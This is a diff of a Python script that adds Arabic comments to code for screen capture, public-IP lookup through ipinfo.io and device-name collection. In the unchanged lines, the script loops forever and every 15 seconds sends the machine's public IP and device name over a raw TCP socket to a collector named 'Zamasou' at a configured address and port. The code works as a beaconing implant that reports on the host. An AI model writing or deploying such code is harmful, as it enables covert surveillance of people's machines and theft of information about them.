@@ -9,11 +9,13 @@ import base64
 from io import BytesIO
 from PIL import Image
 
+# تحديد عنوان IP ومنفذ Zamasou
 ZAMASOU_IP = "127.0.0.1"
 ZAMASOU_PORT = 2024
 
 def capture_screen():
     try:
+        # التقاط لقطة الشاشة
         with mss.mss() as sct:
             screenshot = sct.shot()
             img = Image.open(BytesIO(screenshot))
@@ -26,6 +28,7 @@ def capture_screen():
 
 def send_data(ip, port, data):
     try:
+        # إرسال البيانات إلى Zamasou عبر TCP / IP
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, port))
             s.sendall(data.encode())
@@ -35,6 +38,7 @@ def send_data(ip, port, data):
 
 def get_ip_info():
     try:
+        # الحصول على معلومات عنوان IP العام
         response = requests.get("http://ipinfo.io/json")
         data = response.json()
         ip_address = data.get("ip")
@@ -45,6 +49,7 @@ def get_ip_info():
 
 def get_device_name():
     try:
+        # الحصول على اسم الجهاز
         device_name = platform.node()
         if device_name == "localhost" or not device_name:
             device_name = socket.gethostname()
@@ -65,6 +70,7 @@ def get_device_name():
 
 def fetch_device_name_from_google(query):
     try:
+        # البحث عن اسم الجهاز عبر Google
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
         search_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
         response = requests.get(search_url, headers=headers)
@@ -87,12 +93,13 @@ def main():
     while True:
         ip = get_ip_info()
         if ip:
+            # إعداد بيانات للإرسال إلى Zamasou
             data = f"Public IP address: {ip}, Device Name: {device_name}"
             send_data(ZAMASOU_IP, ZAMASOU_PORT, data)
         else:
             data = f"Failed to retrieve IP information, Device Name: {device_name}"
             send_data(ZAMASOU_IP, ZAMASOU_PORT, data)
-        time.sleep(15)
+        time.sleep(15)  # تكرار كل 15 ثانية
 
 if __name__ == "__main__":
     main()
